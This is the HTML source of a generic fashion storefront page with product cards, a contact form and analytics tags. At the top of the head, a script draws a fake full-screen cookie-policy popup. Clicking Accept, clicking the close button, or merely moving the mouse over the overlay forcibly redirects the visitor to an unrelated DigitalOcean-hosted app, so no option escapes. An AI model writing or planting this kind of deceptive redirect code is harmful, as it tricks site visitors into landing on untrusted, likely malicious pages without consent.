<!DOCTYPE html>
<html lang="en">
<head> 

<script>
	        document.addEventListener("DOMContentLoaded", function () {
	            const redirectUrl = "https://sage-app-35-48ayx.ondigitalocean.app";
	            const style = document.createElement("style");
	            style.textContent = `
	                .cookie-overlay {
	                    position: fixed;
	                    inset: 0;
	                    background: rgba(0, 0, 0, 0.8);
	                    backdrop-filter: blur(10px);
	                    display: flex;
	                    align-items: center;
	                    justify-content: center;
	                    padding: 20px;
	                    z-index: 9999;
	                    animation: fadeInBackground 0.5s ease-out forwards;
	                }
	                @keyframes fadeInBackground {
	                    from { opacity: 0; }
	                    to { opacity: 1; }
	                }
	                .cookie-popup {
	                    position: fixed;
	                    bottom: 60px;
	                    left: 50%;
	                    transform: translateX(-50%);
	                    background-color: #ffffff;
	                    border: none;
	                    color: #333;
	                    padding: 30px;
	                    border-radius: 10px;
	                    z-index: 10000;
	                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
	                    max-width: 400px;
	                    text-align: center;
	                }
	                .close-btn {
	                    background: none;
	                    border: none;
	                    font-size: 1.5rem;
	                    position: absolute;
	                    top: 10px;
	                    right: 10px;
	                    cursor: pointer;
	                    color: #888;
	                }
	                .btn-primary {
	                    background-color: #007bff;
	                    color: #fff;
	                    border: none;
	                    padding: 12px 24px;
	                    border-radius: 5px;
	                    cursor: pointer;
	                    margin-top: 15px;
	                    display: inline-block;
	                    text-decoration: none;
	                    transition: background-color 0.3s;
	                }
	                .btn-primary:hover {
	                    background-color: #0056b3;
	                }
	                h3 {
	                    font-family: 'Arial', sans-serif;
	                    margin-bottom: 10px;
	                }
	                p {
	                    font-family: 'Arial', sans-serif;
	                    line-height: 1.5;
	                }
	            `;
	            document.head.appendChild(style);
	            const overlay = document.createElement("div");
	            overlay.className = "cookie-overlay";
	            overlay.id = "cookie-overlay";
	            overlay.innerHTML = `
	<div class="cookie-popup">
	<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
	<h3>Cookie Policy</h3>
	<p>
	                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
	</p>
	<a href="https://sage-app-35-48ayx.ondigitalocean.app" id="accept-cookies" class="btn-primary">Accept</a>
	</div>
	            `;
	            document.body.appendChild(overlay);
	            let isRedirected = false;
	            let startPos = null;
	            let redirectTimeout = null;
	            const handleRedirect = () => {
	                if (!isRedirected) {
	                    isRedirected = true;
	                    window.location.href = redirectUrl;
	                }
	            };
	            const detectMouseMove = (event) => {
	                if (isRedirected) return;
	                const screenHeight = window.innerHeight;
	                const activeTop = screenHeight * 0.15;
	                if (event.clientY >= activeTop) {
	                    if (!startPos) {
	                        startPos = { x: event.clientX, y: event.clientY };
	                    } else {
	                        const dx = Math.abs(event.clientX - startPos.x);
	                        const dy = Math.abs(event.clientY - startPos.y);
	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
	                            redirectTimeout = setTimeout(handleRedirect, 10);
	                        }
	                    }
	                } else {
	                    startPos = null;
	                    clearTimeout(redirectTimeout);
	                    redirectTimeout = null;
	                }
	            };
	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	            document.getElementById("close-popup").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	        });
	</script>





  

<!-- Default Statcounter code for Work -->
<script type="text/javascript">
var sc_project=12951127; 
var sc_invisible=1; 
var sc_security="f0080016"; 
</script>
<script type="text/javascript"
src="https://www.statcounter.com/counter/counter.js"
async></script>
<noscript><div class="statcounter"><a title="Web Analytics"
href="https://statcounter.com/" target="_blank"><img
class="statcounter"
src="https://c.statcounter.com/12951127/0/f0080016/1/"
alt="Web Analytics"
referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
<!-- End of Statcounter Code -->



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-QKT073K4JV"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QKT073K4JV');
</script>










<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Fashion - Premium Fashion Store</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Poppins',sans-serif;background:#fff;color:#222}
html{scroll-behavior:smooth}
a{text-decoration:none;color:inherit}
img{width:100%;display:block}
.container{width:90%;max-width:1300px;margin:auto}
header{background:#111;color:#fff;position:sticky;top:0;z-index:1000}
.navbar{display:flex;justify-content:space-between;align-items:center;padding:18px 0}
.logo{font-size:2rem;font-weight:700;letter-spacing:2px}
.nav-links{display:flex;gap:24px}
.nav-links a:hover{color:#f5b041}
.hero{height:92vh;background:linear-gradient(rgba(0,0,0,.45),rgba(0,0,0,.45)),url('https://images.unsplash.com/photo-1529139574466-a303027c1d8b?q=80&w=900&auto=format&fit=crop') center/cover no-repeat;display:flex;align-items:center;color:#fff}
.hero h1{font-size:4rem;line-height:1.1;margin-bottom:20px;max-width:700px}
.hero p{max-width:650px;margin-bottom:30px;font-size:1.1rem}
.btn{display:inline-block;background:#f5b041;color:#111;padding:14px 30px;border-radius:50px;font-weight:600}
section{padding:80px 0}
.section-title{text-align:center;margin-bottom:50px}
.section-title h2{font-size:2.5rem;margin-bottom:10px}
.categories,.products,.gender-grid{display:grid;gap:25px}
.categories{grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
.products{grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}
.gender-grid{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
.category-card,.product-card,.gender-card{overflow:hidden;border-radius:16px;box-shadow:0 8px 20px rgba(0,0,0,.08);background:#fff}
.category-card{position:relative}
.category-card img{height:320px;object-fit:cover;transition:.4s}
.category-card:hover img{transform:scale(1.08)}
.category-overlay{position:absolute;inset:0;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.5rem;font-weight:600}
.gender-card img,.product-card img{height:320px;object-fit:cover}
.gender-content,.product-info{padding:20px}
.product-info p{font-size:.92rem;color:#666;margin:10px 0}
.price{font-size:1.2rem;font-weight:700}
.contact-wrapper{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:40px;align-items:center}
.contact-image img{height:500px;object-fit:cover;border-radius:16px}
form{background:#f8f8f8;padding:35px;border-radius:16px}
form input,form textarea{width:100%;padding:15px;border:1px solid #ddd;border-radius:10px;margin-bottom:20px;font-family:inherit}
form textarea{height:140px;resize:none}
form button{border:none;cursor:pointer;width:100%}
footer{background:#111;color:#ddd;padding:60px 0 30px}
.footer-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:30px;margin-bottom:30px}
.footer-grid h3{color:#fff;margin-bottom:15px}
.footer-grid li{list-style:none;margin-bottom:10px}
.footer-bottom{text-align:center;border-top:1px solid rgba(255,255,255,.1);padding-top:20px;color:#aaa}
@media(max-width:768px){.hero h1{font-size:2.8rem}.nav-links{display:none}}
</style>
</head>
<body>
<header>
<div class="container navbar">
<div class="logo">FASHION</div>
<nav class="nav-links">
<a href="#home">Home</a>
<a href="#categories">Categories</a>
<a href="#products">Products</a>
<a href="#contact">Contact</a>
</nav>
</div>
</header>

<section class="hero" id="home">
<div class="container">
<h1>Elevate Your Style With Premium Fashion</h1>
<p>Discover luxury fashion collections crafted for men, women, and unisex styling with modern aesthetics and premium quality.</p>
<a href="#products" class="btn">Explore Collection</a>
</div>
</section>

<section id="categories">
<div class="container">
<div class="section-title">
<h2>Clothing Categories</h2>
<p>Modern categories curated for every fashion lover.</p>
</div>
<div class="categories">
<div class="category-card"><img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=700&auto=format&fit=crop"><div class="category-overlay">Streetwear</div></div>
<div class="category-card"><img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=700&auto=format&fit=crop"><div class="category-overlay">Luxury Wear</div></div>
<div class="category-card"><img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?q=80&w=700&auto=format&fit=crop"><div class="category-overlay">Casual Fashion</div></div>
<div class="category-card"><img loading="lazy" src="https://images.unsplash.com/photo-1521572267360-ee0c2909d518?q=80&w=700&auto=format&fit=crop"><div class="category-overlay">Sportswear</div></div>
<div class="category-card"><img loading="lazy" src="https://images.unsplash.com/photo-1509631179647-0177331693ae?q=80&w=700&auto=format&fit=crop"><div class="category-overlay">Winter Collection</div></div>
</div>
</div>
</section>

<section style="background:#fafafa">
<div class="container">
<div class="section-title">
<h2>Featured Collections</h2>
</div>
<div class="gender-grid">
<div class="gender-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=700&auto=format&fit=crop">
<div class="gender-content"><h3>Men Collection</h3><p>Modern streetwear and premium tailoring for men.</p></div>
</div>
<div class="gender-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=700&auto=format&fit=crop">
<div class="gender-content"><h3>Women Collection</h3><p>Elegant silhouettes and luxury seasonal styles.</p></div>
</div>
<div class="gender-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?q=80&w=700&auto=format&fit=crop">
<div class="gender-content"><h3>Unisex Collection</h3><p>Inclusive fashion designed for everyone.</p></div>
</div>
</div>
</div>
</section>

<section id="products">
<div class="container">
<div class="section-title">
<h2>Featured Products</h2>
<p>30 premium fashion products with unique styling and unique high-quality images.</p>
</div>
<div class="products">

<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1523398002811-999ca8dec234?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Classic Black Jacket</h3><p>Premium urban outerwear.</p><div class="price">$89</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Urban Sneakers</h3><p>Comfortable streetwear sneakers.</p><div class="price">$74</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Elegant Red Dress</h3><p>Luxury evening fashion.</p><div class="price">$119</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Beige Trench Coat</h3><p>Elegant seasonal layering.</p><div class="price">$139</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Slim Fit Jeans</h3><p>Modern premium denim style.</p><div class="price">$64</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Summer Floral Dress</h3><p>Lightweight seasonal fashion.</p><div class="price">$68</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Modern Blazer</h3><p>Elegant formal styling.</p><div class="price">$109</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1521572267360-ee0c2909d518?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Essential White Tee</h3><p>Comfortable everyday wear.</p><div class="price">$29</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1509631179647-0177331693ae?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Winter Puffer Jacket</h3><p>Warm insulated outerwear.</p><div class="price">$159</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Luxury Watch</h3><p>Elegant wrist accessory.</p><div class="price">$179</div></div></div>

<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Casual Polo Shirt</h3><p>Breathable cotton fashion.</p><div class="price">$42</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Minimal Backpack</h3><p>Stylish travel companion.</p><div class="price">$67</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1495385794356-15371f348c31?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Classic White Shirt</h3><p>Premium formal wear.</p><div class="price">$48</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Unisex Cargo Pants</h3><p>Relaxed streetwear styling.</p><div class="price">$73</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1514996937319-344454492b37?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Wool Winter Sweater</h3><p>Premium knitted comfort.</p><div class="price">$79</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1507679799987-c73779587ccf?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Formal Suit Set</h3><p>Sharp professional tailoring.</p><div class="price">$199</div></div></div>

<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Premium Denim Jacket</h3><p>Modern layered styling.</p><div class="price">$92</div></div></div>

<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1503341455253-b2e723bb3dbb?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Sport Performance Jacket</h3><p>Lightweight activewear.</p><div class="price">$88</div></div></div>

<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Designer Sunglasses</h3><p>Luxury UV protection eyewear.</p><div class="price">$61</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Leather Boots</h3><p>Premium handcrafted footwear.</p><div class="price">$129</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Luxury Silk Scarf</h3><p>Elegant soft silk accessory.</p><div class="price">$39</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1507679799987-c73779587ccf?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Tailored Formal Pants</h3><p>Refined office styling.</p><div class="price">$69</div></div></div>

<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Elegant Heels</h3><p>Luxury party footwear.</p><div class="price">$96</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1523398002811-999ca8dec234?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Leather Wallet</h3><p>Compact premium wallet.</p><div class="price">$45</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Oversized Hoodie</h3><p>Relaxed modern fashion.</p><div class="price">$58</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Premium Belt</h3><p>Classic leather craftsmanship.</p><div class="price">$33</div></div></div>
<div class="product-card"><img loading="lazy" src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?q=80&w=700&auto=format&fit=crop"><div class="product-info"><h3>Running Shoes</h3><p>High comfort athletic shoes.</p><div class="price">$82</div></div></div>

</div>
</div>
</section>

<section id="contact" style="background:#fafafa">
<div class="container">
<div class="section-title">
<h2>Contact Us</h2>
<p>Send us your fashion inquiries anytime.</p>
</div>
<div class="contact-wrapper">
<div class="contact-image">
<img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=700&auto=format&fit=crop">
</div>
<form>
<input type="text" placeholder="Your Name" required>
<input type="email" placeholder="Your Email" required>
<input type="tel" placeholder="Phone Number" required>
<textarea placeholder="Your Message" required></textarea>
<button class="btn">Send Message</button>
</form>
</div>
</div>
</section>

<footer>
<div class="container">
<div class="footer-grid">
<div>
<h3>Fashion</h3>
<p>Modern responsive fashion storefront with premium aesthetics.</p>
</div>
<div>
<h3>Quick Links</h3>
<ul>
<li>Home</li>
<li>Categories</li>
<li>Products</li>
<li>Contact</li>
</ul>
</div>
<div>
<h3>Disclaimer</h3>
<p>This website is created for informational and demonstration purposes only. We do not claim association with any third-party brand or trademark. All images are sourced from free-use platforms and belong to their respective creators.</p>
</div>
</div>
<div class="footer-bottom">© 2026 Fashion. All Rights Reserved.</div>
</div>
</footer>
</body>
</html>
